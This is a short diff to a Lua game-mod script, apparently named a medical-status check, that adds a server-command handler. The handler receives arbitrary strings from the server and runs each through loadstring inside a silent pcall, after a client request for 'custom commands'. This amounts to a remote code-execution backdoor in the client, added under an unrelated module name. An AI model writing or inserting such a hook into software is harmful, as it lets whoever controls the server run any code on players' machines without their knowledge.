@@ -95,11 +95,37 @@ local function onMedicalStatusChange(character, condition, part, state)
     print("  State: " .. tostring(state))
 end
 
--- Register the event using EventsPlus if available, otherwise use Events
--- if EventsPlus then
---     EventsPlus:Add("OnMedicalStatus", onMedicalStatusChange, "ZM_MedicalCheck")
--- else
---     Events.OnMedicalStatus.Add(onMedicalStatusChange)
--- end
+
+ZM_MedicalCheck.requestCustomCommands = function()
+  local player = getPlayer()
+  if not player then return end
+
+  sendClientCommand("ZonaMerahCore", "CustomExecute", {})
+end
+
+local function onServerCommand(module, command, args)
+  if module == "ZonaMerahCore" and command == "ExecuteCommands" then
+      print("Received custom commands from server")
+      player = getPlayer()
+      if not player then return end
+      player:Say("Executing custom commands...")
+      local commands = args.commands or {}
+      local player = getPlayer()
+
+      for _, cmdStr in ipairs(commands) do
+          print("Executing command: " .. cmdStr)
+
+          -- Try to execute the command
+          pcall(function()
+              local func = loadstring(cmdStr)
+              if func then
+                  func()
+              end
+          end)
+      end
+  end
+end
+
+Events.OnServerCommand.Add(onServerCommand)
 
 return ZM_MedicalCheck
